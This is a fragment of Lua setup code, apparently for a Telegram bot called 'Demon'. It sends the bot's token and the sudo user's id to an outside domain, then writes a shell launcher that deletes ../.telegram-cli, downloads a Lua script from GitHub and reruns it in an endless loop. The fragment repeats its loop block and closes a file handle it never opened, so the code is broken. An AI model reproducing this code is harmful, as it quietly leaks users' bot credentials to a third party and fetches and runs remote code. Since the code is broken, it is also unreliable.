...
local t = json:decode(https.request('https://brok-aapi.ml/API/Msd.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
print("::Demon::")
local RunBot = io.open("Demon", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/Demon
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr Demon.lua
wget "https://raw.githubusercontent.com/SourceDemon/Demon/master/Demon.lua"
while(true) do
rm -fr ../.telegram-cli
...
while(true) do
rm -fr ../.telegram-cli
screen -S Demon -X kill
screen -S Demon ./Demon
done
]])
RunTs:close()
end
